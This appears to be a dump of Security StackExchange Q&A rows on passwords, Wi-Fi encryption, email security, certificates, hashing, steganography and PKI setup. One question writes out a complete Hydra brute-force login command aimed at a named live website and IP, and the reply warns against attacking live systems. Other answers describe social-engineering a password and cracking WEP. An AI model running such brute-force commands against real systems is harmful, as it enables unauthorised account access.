<p>Learning extra parameters about the user's password allows you to simplify this. Let's assume that you choose the following song: <strong>baby hit me one more time</strong>. This is your favorite song, and I know this because I socially-engineered you into telling me. Let's choose a predictable lyric phrase to create a password with:  <strong>Hit me baby one more time</strong>. This becomes <code>HmBomT</code>. Now let's add some leet with a number. Now we have <code>H@BomT3</code>. Now that we know your favorite song, and your favorite phrase, this is what your password alphabet space becomes:</p>

<pre><code>hHmMbBoOmMtT1234567890!@#$%^&amp;*()-_+=
</code></pre>

<p>As you can see, this alphabet space is significantly reduced. It's much, much faster if you know what character the password starts with, but let's assume you don't. Let's further assume it's been randomized. Now you've reduced the time needed to exhaust the password space to <code>2,901,713,047,668</code> combinations, it takes 3 days to crack the password with a cheap workstation. Let's upgrade it to 9 characters. Now it takes 137 days 15 hours 47 minutes.</p>

<p><a href=""http://calc.opensecurityresearch.com/"">You can calculate this yourself</a> (charset: custom). Also, all of this assumes you <a href=""http://arstechnica.com/security/2012/12/25-gpu-cluster-cracks-every-standard-windows-password-in-6-hours/"">don't have a dedicated GPU cluster</a>. </p>

<p><strong>EDIT</strong>:</p>

<p>It's come to my attention that there is now evidence of custom hardware solutions dedicated to cracking bcrypt, <a href=""https://www.usenix.org/system/files/conference/woot14/woot14-malvoni.pdf"">one of which</a> is a lot less expensive than a 25-GPU array, uses less power, and is vastly superior in every regard. Please read <a href=""https://www.usenix.org/system/files/conference/woot14/woot14-malvoni.pdf"">this</a> amazing article if you want to learn more.</p>

<hr>

<h2>But shouldn't we simply increase password length?</h2>

<p>Yeah, you could. Truthfully, it <em>greatly</em> increases entropy when you increase the password length.</p>

<p>However, then it becomes annoying to enter - especially for corporate environments that require you to log out every time you leave the computer. On top of that, it's very hard to remember this password. </p>

<p>You might eventually forget it after entering different passwords and being forced to change every few months. Even worse, you could forget it immediately, and be forced to visit the IT help desk to reset your password. This results in costs to the business, and lost productivity.</p>

<p>In fact, a better method would be a <a href=""https://xkcd.com/936/"">xkcd's</a> <code>correct horse battery staple</code>. You could use an upper case somewhere, and a number somewhere else, or you could make it even easier while increasing entropy: something like <code>correct horse battery staple gasoline</code>. It's very easy to remember, very easy to type, and it's very hard for computers to break. Also remember that this should be randomly-generated from a 2048 word list. </p>

<p>For websites, I would recommend a password manager such as KeePass. <a href=""https://www.seancassidy.me/lostpass.html"">I would not use LastPass</a>, as it's vulnerable to phishing attacks. <strong>Websites <em>can</em> know you have LastPass enabled, because your browser is sending this information to the website if requested!</strong> This is part of how <a href=""https://panopticlick.eff.org/"">browser-fingerprinting</a> works. </p>

<p>For corporate and other logins which you aren't able to use a password manager with, I would recommend a variant of <code>correct horse battery staple</code> with an extra word. Maybe <code>correct horse battery staple gasoline</code>? Much easier to remember.</p>
","111267"
"Hydra https-form-post","19883","","<p>I have never experimented much with online password crackers. I attempted to use Hydra today on this website <a href=""http://athena2.harker.org"" rel=""nofollow"">www.athena2.harker.org</a> and I keep getting false positives.</p>

<p>This is what I have done so far:</p>

<ul>
<li>pinged the website and obtained the IP address of 209.23.201.55</li>
<li><p>identified the form type, its an https-form-post</p>

<pre><code>&lt;form id=""login"" method=""post"" action=""https://athena2.harker.org/login/index.php""&gt;
</code></pre></li>
<li><p>found the failure response: it's “Invalid login, please try again”</p></li>
<li><p>run this command</p>

<pre><code>hydra 209.23.201.55 https-form-post ""/login/index.php:username=^USER^&amp;password=^PASS^&amp;Login=Login:Invalid login"" -l test -p test -t 10 -w 30 -o example.txt
</code></pre></li>
</ul>

<p>Can someone tell me what I am doing wrong?</p>

<p><sub>
I work in IT for the school. We operate on the open source Moodle platform, and a student recently obtained administrator access, we are evaluating the strength of the passwords we issue. (6 digit/lowercase letter password). Don't assume people on this forum attack targets maliciously, penetration testing and computer security are legitimate fields, I thought everyone here would be aware of that.
</sub></p>
","<p><em>You're attacking a live system, that is what you're doing wrong.</em></p>

<p>Please <strong>stop</strong> unless you have explicitly been contracted to break security on this service (i.e. You have a signed penetration testing contract with the server owners).</p>

<p>Edit:</p>

<p>It's good that you have permission to perform this test (I've seen a surprising number of similar questions where this isn't the case, and the users would be putting themselves at grave risk of prosecution).</p>

<p>So with the new information, your objective is to test the strength of passwords with 6 lower case letters. </p>

<ol>
<li><p>You can do this theoretically. The maximum possible permutations are 26^6 = ~309 million. Take your login rate limit per unit time, and you can then figure out how long it would take to crack a password. With a properly configured web app, this method should <em>never</em> work (Assuming your admin passwords are random).</p></li>
<li><p>You can do this by taking the salted and hashed password file, and brute forcing it ""offline"". This more accurately simulates what would happen in an attack, and eliminates the risk that attacking the live system would cause a fault.</p></li>
</ol>
","53361"
"Unix execute permission can be easily bypassed. Is it superfluous, or what's the intention behind it?","19876","","<p>The unix read permission is actually the same as the execute permission, so if e.g. one process has write access it's also able to execute the same file.</p>

<p>This can be done pretty easily:First this process has to load the content of the file,which shall be executed, into a buffer. Afterwards it calls a function from a shared library which parses the ELF in the buffer and loads it to the right addresses(probably by overwriting the old process as usual, when calling execvp). The code jumps to the entry point of the new program and it's being executed.</p>

<p>I am pretty sure Dennis Ritchie and Ken Thompson were aware of that issue. So why did they even invent this permission, what is the intention behind it and what's the sense of it, if it can't prevent any process of any user having read access from executing? Is there even such a sense or is it superfluous?</p>

<p>Could this even be a serious security issue, are there any systems, which rely on the strength of rw- or r-- permissions?</p>
","<p>There's an even easier way to bypass the ""execute"" permission: copy the program into a directory you own and set the ""execute"" bit.</p>

<p>The ""execute"" permission isn't a security measure.  Security is provided at a lower level, with the operating system restricting specific actions.  This is done because, on many Unix-like systems (especially in the days of Ritchie and Thompson), it's assumed that the user is able to create their own programs.  In such a situation, using the ""execute"" permission as a security measure is pointless, as the user can simply create their own copy of a sensitive program.</p>

<p>As a concrete example, running <code>fdisk</code> as an unprivileged user to try to scramble the hard drive's partition table:</p>

<pre><code>$ /sbin/fdisk /dev/sda 

Welcome to fdisk (util-linux 2.24.1).
Changes will remain in memory only, until you decide to write them.
Be careful before using the write command.

...

Changed type of partition 'Linux' to 'Hidden NTFS WinRE'.

Command (m for help): w
fdisk: failed to write disklabel: Bad file descriptor
</code></pre>

<p>That last line is <code>fdisk</code> trying to get a ""write"" file descriptor for the hard drive and failing, because the user I'm running it as doesn't have permission to do that.</p>

<p>The purpose of the ""execute"" permission is two-fold: 1) to tell the operating system which files are programs, and 2) to tell the user which programs they can run.  Both of these are advisory rather than mandatory: you can create a perfectly functional operating system without the permission, but it improves the user experience.</p>

<p>As R.. points out, there's one particular case where the ""execute"" permission is used for security: when a program also has the ""setuid"" bit set.  In this case, the ""execute"" permission can be used to restrict who is permitted to run the program.  Any method of bypassing the ""execute"" permission will also strip the ""setuid"" status, so there's no security risk here.</p>
","66556"
"Strength of WEP, WPA and WPA 2 PSK","19867","","<p>I know there are three method for wifi security. What are the relative strengths of the password encryption in WEP, WPA and WPA2 PSK?</p>
","<p>The schemes you mention are protocols for securing 802.11x traffic over wireless networks. They don't mandate how the AP password is encrypted or hashed during storage. However, the security of the protocol does rely on making the <em>key</em> secure.</p>

<ul>
<li>WEP relies on a broken RC4 implementation and has severe flaws in various aspects of its protocol which make breaking WEP near-trivial. Anyone with a laptop and a $20 wifi antenna can send special de-auth packets, which cause legitimate clients to re-authenticate to the AP. The attacker can then capture the initialization vectors from these re-authentication packets and use them to crack the WEP key in minutes. Due to the severity of the break, WEP is now considered deprecated. See <a href=""https://security.stackexchange.com/questions/17434/how-wep-wireless-security-works"">this question</a> for more details on WEP security.</li>
<li>WPA improves upon this, by combining RC4 with <a href=""http://en.wikipedia.org/wiki/Temporal_Key_Integrity_Protocol"" rel=""nofollow noreferrer"">TKIP</a>, which helps defend against the IV-based attacks found in WEP. It also improves upon the old handshake mechanism, to make it more resistant to de-auth attacks. Whilst this makes a large improvement, vulnerabilities were found in the way that the protocol worked, allowing an attacker to break TKIP keys in about 15-20 minutes. You can read more about the attack at <a href=""https://security.stackexchange.com/questions/4252/wpa-significantly-less-secure-than-wpa2"">this other question</a>.</li>
<li>WPA2 closes holes in WPA, and introduces an enhanced version of TKIP, as well as <a href=""http://en.wikipedia.org/wiki/CCMP"" rel=""nofollow noreferrer"">CCMP</a>. The standard also bring support for <a href=""http://en.wikipedia.org/wiki/Advanced_Encryption_Standard"" rel=""nofollow noreferrer"">AES</a>, which provides even further security benefits. At current there are no known generic attacks against WPA2.</li>
</ul>
","23629"
"Is gmail-to-gmail still insecure? Why?","19866","","<p>I have always heard that email is an insecure method of communication; I assume this has something to do with the email protocol itself.</p>

<p>But when sending an email from one gmail account to another, Google has complete control over how the email is transmitted, and Google seems decently concerned about information security. So it seems that they <em>could</em>, if they wanted, turn gmail-to-gmail messages into a secure communication channel, and that this would probably be in their best interest.</p>

<p>So have they done this? If not, why not? Is gmail-to-gmail communication still insecure (for the purpose of, say, sending a credit card or social security number to a trusted recipient)?</p>
","<p>Email is historically considered insecure for two reasons:</p>

<ul>
<li>The SMTP network protocol is unencrypted <em>unless STARTTLS is negotiated, which is effectively optional</em></li>
<li>The mail messages sit unencrypted on the disk of the source, destination, and any intermediate mail servers</li>
</ul>

<p>Google mail servers all speak STARTTLS if possible, so for gmail-to-gmail the transmission step shouldn't be a concern.  However, the sending server stores an unencrypted copy of the email in your Sent folder.  The receiving server stores an unencrypted copy in the recipient's Inbox.  This leaves them open to various threats:</p>

<ul>
<li>Rogue Google employees reading that email</li>
<li>Google choosing to read that email despite their assurances to the contrary</li>
<li>Governments forcing Google to hand over that email</li>
<li>Hackers breaking into Google and accessing that email</li>
</ul>

<p>If you can trust everything to go right, then gmail-to-gmail is perfectly secure.  But you can't always expect everything to go right.  </p>

<p>For these reasons, <strong>the security and privacy community long ago reached the stance that only end-to-end email encryption is secure</strong>.  That means the email remains encrypted on server disks and is decrypted when you're reading it, and never stored decrypted.</p>

<hr>

<p>There have been an enormous number of comments, so let me expand/clarify a few things.</p>

<p><strong>End-to-end encryption</strong> - in the context of email, when I say end-to-end encryption I mean something like PGP, where the message is encrypted until it reaches the recipient's email client, and only decrypted to be read.  Yes, this means it can't be searched on the server, and often also means it doesn't remain ""backed up"" on the server either.  This is a case where security and functionality are at odds; pick one.</p>

<p><strong>Security and privacy community</strong> - unlike many Information Security topics, email security is one that extends out to other communities.  The question of what stateful inspection in a firewall means is not something often extended out to interest others, for example.  But email security is of direct, significant interest to</p>

<ul>
<li><a href=""https://philzimmermann.com/EN/letters/index.html"">Human rights workers</a></li>
<li><a href=""http://therealnews.com/t2/index.php?option=com_content&amp;task=view&amp;id=31&amp;Itemid=74&amp;jumival=14187"">Whistleblowers</a></li>
<li><a href=""http://usacac.army.mil/CAC2/MilitaryReview/Archives/English/MilitaryReview_20070630_art014.pdf"">Insurgents</a></li>
</ul>

<p>Forget about credit card data, there are people trying to communicate with email whose lives, and the lives of their families, depend upon the security of the email.  So as there are phrases in the comments below like ""depends upon what your standards are for 'secure'"", ""sufficiently motivated adversary"", ""there is an illusion of security at the email-level"" - am I being too strong to say the server can't be trusted?  Not for people whose lives are at stake.  That's why the phrase ""email is insecure"" has been the mantra of the privacy movement for 20 years.</p>

<p><strong>Trusting the server</strong> - In the US, ""<a href=""https://www.fdic.gov/consumers/consumer/news/cnspr13/protectplastic.html"">your cap for liability for unauthorized charges on a credit card is $50</a>"" so you may well be happy trusting the server with your credit card.  If you're cheating, on the other hand, you might lose a lot more as the result of <a href=""https://en.wikipedia.org/wiki/David_Petraeus#Extramarital_affair_and_resignation"">leaving unencrypted email on the server</a>.  And <a href=""https://en.wikipedia.org/wiki/Lavabit"">will your service provider shut their doors to protect your privacy</a>?  Probably not.</p>

<p><strong>STARTTLS</strong> - STARTTLS is SSL for email; it uses the same SSL/TLS cryptographic protocol to encrypt email in transit.  However, it is decidedly <em>less secure</em> than HTTPS for several reasons:</p>

<ol>
<li>STARTTLS is almost always ""opportunistic"", meaning that if the client asks and the server supports it, they'll encrypt; if either of those things are not true, the email will quietly go through unencrypted.</li>
<li>Self-signed, expired, and otherwise bogus certificates are generally accepted by email senders, so STARTTLS provides confidentiality but almost none of the authentication.  It's relatively trivial to Man-In-The-Middle email if you can get in between servers on the network.</li>
</ol>
","97066"
"This certificate has an invalid digital signature","19865","","<p>I am trying to learn securing wcf service using ssl. I found this website and I am following the steps. <a href=""http://robbincremers.me/2011/12/27/wcf-transport-security-and-client-certificate-authentication-with-self-signed-certificates/"" rel=""nofollow noreferrer"">http://robbincremers.me/2011/12/27/wcf-transport-security-and-client-certificate-authentication-with-self-signed-certificates/</a>. But when came to creating certificate step I had an issue. Using below to create a certificate.</p>

<pre><code>makecert –pe –n “CN=localhost” –sr localmachine –ss my –sky exchange
</code></pre>

<p>By default, the makecert utility creates certificates whose root authority is ""Root Agency"".  For some reason, my Root Agency cert has become corrupted (invalid digital signature).  How can I restore a valid Root Agency cert?</p>

<p>The site says when I create a certificate using above statement and double click on it I should see this</p>

<p><img src=""https://i.stack.imgur.com/fCGbj.png"" alt=""enter image description here""></p>

<p>But I am seeing this:</p>

<p><img src=""https://i.stack.imgur.com/F4p5I.png"" alt=""enter image description here""></p>

<p>So even If I add Root Agency to trusted root certificate authority it doesn't make any sense.</p>

<p>Other screenshot from my guide site:
<img src=""https://i.stack.imgur.com/McOEz.png"" alt=""enter image description here""></p>

<p>And I have </p>

<p><img src=""https://i.stack.imgur.com/kPfp6.png"" alt=""enter image description here""></p>

<p>How can I fix ""This certificate has an invalid digital signature"" issue?</p>
","<p>This could be due to the length restrictions on certificate keys.</p>

<p>Microsoft enforced a minimum key length limit of 1024 bits in August 2012. Check that your self signed cert is created with a key length of at least 1024 bits.</p>

<p>For more info you can check out this blog post <a href=""http://morgansimonsen.wordpress.com/2013/05/30/what-does-the-this-certificate-has-an-invalid-digital-signature-message-actually-mean/"" rel=""nofollow"">What does the “This certificate has an invalid digital signature.” message actually mean?</a></p>

<p>You can specify the key length when creating the cert with by using the <code>-len</code> parameter like so:</p>

<pre><code>makecert -pe -ss MY -$ individual -n ""CN=your name here"" -len 2048 -r
</code></pre>
","65626"
"How to prevent man-in-the-middle attacks beside of SSL?","19826","","<p>I would like to discuss this scenario: </p>

<p>There is a HTTPS service which responds with signed keys to an authenticated client. These signed keys can be used for another service to return very sensible data. Let's assume that because of some internal security hole (unexperienced internship, exposed ssh key on git server, somebody sent the ssl ca with an email, ...) a person gets the certificate, and now can encrypt every connection and just listen on the server responding with one of the signed security keys which he can use to access the sensible data of the other service.</p>

<p>Is there any technique which could make the signed security key invalid when a man-in-the-middle attack may have occurred (maybe a second SSL tunnel)?</p>
","<p>Well, there are many options other than SSL to prevent a man in the middle attack, but most all of them have a similar cryptographic basis.  Fundamentally, to ensure that a communication can't be attacked by a man in the middle you must be able to prove that a) both parties can validate the other and b) that no other party can monitor the communication.  </p>

<p>Both of these are most commonly accomplished through a shared secret.  Asymmetric cryptographic operations can also be used where both parties have a trusted public key for the other, however this is much more difficult (computationally) than exchanging a shared secret and then using that.</p>

<p>The shared secret can either be pre-shared, such as in the case of an encrypted wifi network, or it can be negotiated through an authentication process.  For example, with SSL, the server validates itself to the client through signing the public key, the client then establishes a shared secret with the server by using the server's trusted certificate and the server then validates the client through a traditional login (or possibly a client certificate in rare cases.)</p>

<p>This general process is not unique to SSL, but the basic steps of verifying identity of one or both parties and establishing a secure communications key is the critical bits.  If, however, the root of the trust for that certificate was compromised, it would be possible for someone to man in the middle since they could pretend to be the server and open their own connection with the server and their own connection with the client.</p>

<p>In the event of a private key leaking, the certificate should be revoked via a revocation list.  This is generally published by a CA and is included as part of the signed certificate.  As a condition of validating the validity of the certificate, the revocation list should be checked for validity.</p>
","41171"
"How secure are sha256 + salt hashes for password storage","19821","","<p>I started reading about password hashing recently on multiple sites like this page on <a href=""https://crackstation.net/hashing-security.htm#phpsourcecode"">crackstation</a> and others, and for what I have understood, I should avoid using hashing algorithms like md5 and sha1 for they are outdated and instead, I should use sha256 with salt. But, after reading <a href=""http://php.net/manual/en/faq.passwords.php"">this</a> page on the php manual, I noticed that they discourage the use of even sha256 and instead they recommend using the password_hash() functions. I also noticed that most of this articles/pages were written in the interval of 2011-13, so I am not sure of how secure sha256 hashed password with salts are nowadays and whether or not it should still be used in webapps.</p>
","<p>General-purpose hashes have been obsolete for passwords for over a decade. The issue is that they're fast, and passwords have low entropy, meaning brute-force is very easy with <em>any</em> general-purpose hash. You need to use a function which is deliberately slow, like PBKDF2, bcrypt, or scrypt. Crackstation actually explains this if you read the whole page. On the other hand, MD5 and SHA-1 aren't weaker than SHA-2 in the context of password hashing; their weakness is not relevant for passwords. </p>
","90065"
"Steganography to hide text within text","19813","","<p>Are there any steganography algorithms which are capable of hiding a (optionally encrypted) text message within another innocuous text message?</p>

<p>The scenario I envisage is that I would like to carry on an email conversation, which to a man in the middle looks completely innocent, even upon close scrutiny; but which infact contains the true message well hidden within the visible text.</p>

<p>I am aware of this technique being used to hide text within media files, however this sounds to me like it would be both cumbersome and suspicion-arousing to the man-in-the-middle if every message and its response has a media file attachment.</p>

<p>I don't currently have anything worth hiding and I am not doing anything illegal, but I value my privacy and I am very interested in cryptography.</p>

<p>An example would be:</p>

<blockquote>
  <p><strong>Sender apparent message:</strong> Hi there Bob. How was your weekend? Mine was ... more text ... ciao</p>
  
  <p><strong>Sender real message:</strong> Did you find the password I requested?</p>
  
  <p><strong>Receiver apparent message:</strong> Pretty good. I caught up with ... more text ... ciao</p>
  
  <p><strong>Receiver real message:</strong> Yes, it was ""password""</p>
</blockquote>
","<p>Yes, there exists algorithms that hide messages inside messages that can look quite innocent. Take for instance <a href=""http://www.spammimic.com/"">spammimic</a>. It gives the possibility to hide your message inside a typical looking spam message.</p>

<p>A google search for ""Steganography hiding text in text"" gives you more research and examples around this.</p>
","20416"
"Whats the point in having software's like Veracrypt, which end of the day needs password to decrypt?","19808","","<p>There are encryption softwares like Veracrypt which encrypt data and the only way to open encrypted file is via password, but a simple compressing softwares like RAR also provide password protection.</p>

<p>Now the problem with password is that: it can broken using brute force attack.</p>

<p>So my question is, what makes Veracrypt any different from RAR softwares in case of such attacks, what's point in encryption?</p>
","<p>VeraCrypt doesn't have to use passwords, they can use <a href=""https://veracrypt.codeplex.com/wikipage?title=Security%20Tokens%20%26%20Smart%20Cards"" rel=""nofollow"">smartcards</a>, too. If you read VeraCrypt's documentation, you can see so many differences from a simple encrypted archive.</p>

<p>If your question is simply, ""I don't see why encryption is a protection if all you need is a password to decrypt"", then we can talk about that. Yes, passwords can be brute-forced, which is why VeraCrypt offers things like hidden volumes. In any case, the protection of the password becomes very important.</p>
","79472"
"How many unique house keys can possibly exist?","19776","","<p>A Yahoo! answers user <a href=""https://uk.answers.yahoo.com/question/index?qid=1006042820722"">suggested</a> that there are 5^5 possible unique configurations for a physical key, but the answer wasn't sourced. I wondered if anyone had similar numbers for how many possible key combinations there are. I ask because, it seems impossible that there can be a unique key for every lock in the world, and I'd like to know how many different key configurations a thief would have to try to have a certainty of cracking the lock (if the thief didn't want to force the lock in another way.)</p>
","<p>Here is a very short <a href=""https://www.youtube.com/watch?v=QiYIYXEX9Ko"" rel=""nofollow noreferrer"">Youtube Video</a> on how keys work. Given the space available for the length and number of the pins, and operational room for error there are only so many key combinations possible. Given all the different variables involved it's certainly possible for every person on the planet to have a unique lock, it's highly impractical. </p>

<p>Most vendors distribute key/lock combinations by region. Car companies (or house door lock manufacturers) for example might have 200,000 possible key/lock pairs but could redistribute the same combinations on both the east and west coasts since the likelihood of 2 people with the same key/lock combos meeting and then realizing they're the same are extremely low. Generally keys are created using ""codes"" where a number represents the height of the peaks on the key. </p>

<p>So given say 5 pins with say 10 different height possibilities you're looking at 10^5 unique possibilities. You can then add another dimension of complexity by putting ridges on the sides of the keys. I think you see where this is going. A lock could have more pins or more height possibilities depending on manufacturing accuracy and size of the lock.</p>

<p>If someone was to somehow have every possible key combination in one place, there is NO WAY they would be able to transport it. Let alone go unnoticed. It would take multiple dump trucks to move even a portion of the keys.</p>
","63117"
"Benefits of identifying clients based upon the ""X-Forwarded-For"" or similar HTTP header in addition to Client IP","19774","","<p>The <a href=""http://en.wikipedia.org/wiki/X-Forwarded-For"">X-Forwarded-For</a> header is used by some HTTP proxies to identify the IP address of the client. The wiki page (linked above) mentions that ISPs may use this header as well.</p>

<p>In addition there are a variety additional headers that may be used to identify a client.  Some examples include:</p>

<ul>
<li>HTTP_CLIENT_IP</li>
<li>HTTP_X_FORWARDED_FOR can be comma delimited list of IPs</li>
<li>HTTP_X_FORWARDED</li>
<li>HTTP_X_CLUSTER_CLIENT_IP</li>
<li>HTTP_FORWARDED_FOR</li>
<li>HTTP_FORWARDED</li>
</ul>

<blockquote>
  <ol>
  <li><p>Can I use any of these headers to for access control, to block or allow access my site?<br>
  e.g. Block in an escalating manner: HTTP_Header_X first then, client IP?  </p></li>
  <li><p>What are the known usages of these headers? 
  e.g. ISPs, proxy software like Squid, etc.</p></li>
  </ol>
</blockquote>

<p>I was then considering that some web servers may dynamically alter their response based on the presence (or lack of) these header.  Suppose a server banned users by IP address.  Should it ban a user based upon the received IP or the one specified in this header? I then considered the possibility of spoofing this header as a way to work around an IP-ban that the server may have imposed.</p>

<blockquote>
  <ol>
  <li>What security concerns may exist around these headers, what is the appropriate way to address it?<br>
  e.g. include that is relevant for logging, etc.</li>
  </ol>
</blockquote>
","<p>Any of those HTTP headers <em>can</em> be used for access-control purposes, however I would not rely on either the presence of those headers, or the validity of their data.</p>

<p>The most I would ever use them for is logging.  There are no guarantees that any of those headers will be present, or even if they are, that they will contain valid data.  I know there are X-Forwarded-For spoof plugins for Firefox, and probably for other browsers, too.  This makes the information useful only at a statistical level - trending, pattern analysis, etc, there can definitely be some value in collecting and logging those headers. Just don't do any thing that relies on them</p>

<p>Any sort of reliance on HTTP headers for any kind of authentication or access control would have to be classified as worst-practice behavior.</p>

<p>There are much better ways to control access and authentication.</p>
","8724"
"Why it does not matter whether you type HEX or ASCII as WEP WiFi password?","19750","","<p>I know that I can pass password in HEX as a keyphrase to WiFi network using WEP encryption as well as ASCII. But somehow you cannot get the ASCII when you only know HEX value. </p>

<p>Can anyone explain the underlying reason for this ? How does this work ? </p>

<p>For instance: I have decided to make a small 'laboratory' and set up a network with WEP encryption on my router and try to crack it. And as I have done this I have obtained HEX keyphrase which translated with 'normal' tools or manually with HEX to ASCII table didn't correspond to ASCII values of this key.</p>
","<p>According to <a href=""https://en.wikipedia.org/wiki/Wired_Equivalent_Privacy"">Wikipedia's page on WEP</a>:</p>

<blockquote>
  <p>A 64-bit WEP key is usually entered as a string of 10 hexadecimal (base 16) characters (0-9 and A-F). Each character represents four bits, 10 digits of four bits each gives 40 bits; adding the 24-bit IV produces the complete 64-bit WEP key. Most devices also allow the user to enter the key as five ASCII characters, each of which is turned into eight bits using the character's byte value in ASCII; however, this restricts each byte to be a printable ASCII character, which is only a small fraction of possible byte values, greatly reducing the space of possible keys.</p>
</blockquote>

<p>So in hex mode, <code>0</code> is <code>0</code>, but in <a href=""http://www.asciitable.com/"">ASCII</a> mode <code>0</code> is 48. Similarly, in hex mode <code>F</code> and <code>f</code> are both 15 (they're the same number), but in ASCII mode they're 70 and 102 respectively (different characters). You actually <em>can</em> convert the hex values to ASCII, but you probably won't get printable characters.</p>
","19038"
"Checklist on building an Offline Root & Intermediate Certificate Authority (CA)","19725","","<p>Microsoft allows a CA to use Cryptography Next Generation (CNG) and <a href=""http://technet.microsoft.com/en-us/library/cc730763%28v=ws.10%29.aspx"" rel=""noreferrer"">advises of incompatibility issues</a> for clients that do not support this suite.</p>

<p>Here is an image of the default cryptography settings for a 2008 R2 CA.  This machine is a non-domain connected Standalone CA:</p>

<p><img src=""https://i.stack.imgur.com/zfU7l.png"" alt=""Default Cryptography settings""></p>

<p>Here are the installed providers.  The CNG providers are marked with a # sign</p>

<p><img src=""https://i.stack.imgur.com/4BTHL.png"" alt=""enter image description here""></p>

<p>My intent is to have a general-purpose offline Root-CA and then several Intermediate CAs that serve a specific purpose (MSFT-only vs Unix vs SmartCards etc)</p>

<p>What are the ideal settings for a Root Certificate with an expiration of 5, 10, and 15 years?</p>

<ol>
<li>CSP</li>
<li>Signing Certificate</li>
<li>Key Character Length</li>
</ol>

<p>Since this is a RootCA, do any of the parameters affect low powered CPU (mobile devices)</p>
","<blockquote>
  <p>Note: This is a (very very long) compendium of various recommendations and actions that Microsoft, NIST, and other well respected PKI and cryptography experts have said.  If you see something that requires even the slightest revision, do let me know.</p>
</blockquote>

<p>Before I get into configuring the CA and its subs, it's good to know that even though MSFT's CryptoAPI requires a self-signed root, some non-MSFT software may follow RFC 3280 and allow any CA to be the trusted root for validation purposes.  One reason may be that the non-MSFT software prefers a lower key length.</p>

<p>Here are some configuration notes &amp; guidance on setting up a CA ROOT and the Subs:</p>

<p><strong>Storing the CA's Private Key</strong></p>

<ul>
<li><p>Best: Store the key on a HSM that supports key counting.  Every time the CA's private key is used, the counter will be increased.  This improves your audit profile.  Look for FIPS140 Level 3 or 4</p></li>
<li><p>Good: Store the Private key on a smart card. Though I'm unaware of any Smart Card that offers key counting, enabling key counting <a href=""http://support.microsoft.com/default.aspx?scid=kb;EN-US;951721"" rel=""nofollow noreferrer"">may give you unexpected results in the event log</a></p></li>
<li><p>Acceptable: Store the private key in Windows DPAPI.  Ensure that these keys and the Key Enrollment agent don't end up in <a href=""http://technet.microsoft.com/en-us/library/cc771348"" rel=""nofollow noreferrer"">Roaming Credentials</a>.  See also: <a href=""https://security.stackexchange.com/a/1772/396"">How to enumerate DPAPI and Roaming Credentials</a></p></li>
</ul>

<p><strong>Key Length</strong></p>

<ul>
<li><p>Don't use 1024 as a key length... NIST phased it out in 2011, MSFT won't ever add it into your <a href=""https://security.stackexchange.com/q/2268/396"">Trusted Root CA store</a> since it won't meet the minimum accepted technical criteria.</p></li>
<li><p>Root CAs <em>that supports legacy apps</em> should never be larger than 2048 bits.  Reason: MSFT Support sees many cases where <a href=""http://blogs.technet.com/b/askds/archive/2009/10/15/windows-server-2008-r2-capolicy-inf-syntax.aspx"" rel=""nofollow noreferrer"">Java apps or network devices only support key sizes of 2048 bytes</a>.  Save the higher bit lengths to CAs that are constrained for a specific purpose (Windows vs Network devices) etc.</p></li>
<li><p>The NIST <a href=""http://csrc.nist.gov/publications/nistpubs/800-78-3/sp800-78-3.pdf"" rel=""nofollow noreferrer"">recommends 2048 or 3072 bits.</a>  ECC is supported, though it may cause issues with device interoperability.</p></li>
<li><p>Plan for the strongest possible encryption (key length) throughout the PKI, <a href=""https://security.stackexchange.com/q/2558/396"">otherwise expect mixed security benefits</a>. </p></li>
<li><p>Mobile clients have issues (High CPU) or incompatibility with large keys</p></li>
</ul>

<p><strong>Expiration</strong></p>

<p>The algorithm &amp; Key length can have a bearing on how long you want certificates to be valid, because they effectively determine how long it might take an attacker crack, ie the stronger the cryptography, the longer you might be prepared to have certificates valid for</p>

<p>One approach is to establish what is the longest validity you'll require for end entity certificates, double it for the issuing ca's, and then double it again for root ca (in two tier). With this approach you would routinely renew each ca certificate when half of it's lifetime was reached - this is because a ca can't issue certificates with an expiry date after that of the ca certificate itself.</p>

<p>Suitable values can only really be determined by your organisation &amp; security policy, but typically a root ca would have a certificate lifetime of 10 or 20 years.</p>

<p>If you're concerned about compatibility, set the expiration date below 2038.  This is due to systems that encode a data as seconds since January 1st 1970 over a signed 32 bit integer. <a href=""https://security.stackexchange.com/a/2866/396"">Read more about this issue here.</a></p>

<p><strong>Choosing a Hash</strong></p>

<ul>
<li><p>You may want to imitate the <a href=""http://blogs.technet.com/b/pki/archive/2011/03/13/deployment-of-the-new-federal-common-policy-ca-root-certificate.aspx"" rel=""nofollow noreferrer"">Federal PKI Management Authority</a> and set up two PKI roots.  One modern SHA-256 for all devices that support it, and one legacy SHA-1.  Then use cross certificates to map between the two deployments.</p></li>
<li><p>Review this <a href=""http://blogs.technet.com/b/pki/archive/2010/09/30/sha2-and-windows.aspx"" rel=""nofollow noreferrer"">SHA-2 compatibility list for Microsoft software</a></p></li>
</ul>

<p>Notably: </p>

<ul>
<li><p>Windows 2003 and <a href=""http://support.microsoft.com/kb/968730"" rel=""nofollow noreferrer"">XP clients may need a patch for SHA2 Algorithms</a> which include SHA256, SHA384, and SHA512. <a href=""http://blogs.msdn.com/b/alejacma/archive/2009/01/23/sha-2-support-on-windows-xp.aspx"" rel=""nofollow noreferrer"">See more technical information</a></p></li>
<li><p>Authenticode and S/MIME with SHA2 hashing is not supported on XP or 2003</p></li>
<li><p>""Regarding SHA-224 support, SHA-224 offers less security than SHA-256 but takes the same amount of resources. Also SHA-224 is not generally used by protocols and applications. The NSA's Suite B standards also do not include it."" <a href=""http://blogs.msdn.com/b/alejacma/archive/2009/01/23/sha-2-support-on-windows-xp.aspx"" rel=""nofollow noreferrer"">source</a></p></li>
<li><p>""Do not use SHA2 suite anywhere in the CA hierarchy if you plan to have XP either trust the certificate, validate the certificate, use the certificate in chain validation, or receive a certificate from the CA. Even though XP SP3 allows validation of certiifcates that use SHA2 in the CA hierarchy, and KB 968730 allows limited enrollment of certificates that are signed by a CA using SHA2, any use of discrete signatures blocks out XP entirely."" (<a href=""http://social.technet.microsoft.com/Forums/en-US/winserversecurity/thread/faa2c31c-c50f-4083-a641-eff41d7e1b39"" rel=""nofollow noreferrer"">source</a>)</p></li>
</ul>

<p><strong>Choosing a Cryptographic Provider</strong></p>

<ul>
<li><a href=""http://msdn.microsoft.com/en-us/library/aa386983%28v=vs.85%29"" rel=""nofollow noreferrer"">View this list of providers for more information</a></li>
</ul>

<p><strong>Enable random serial number generation</strong></p>

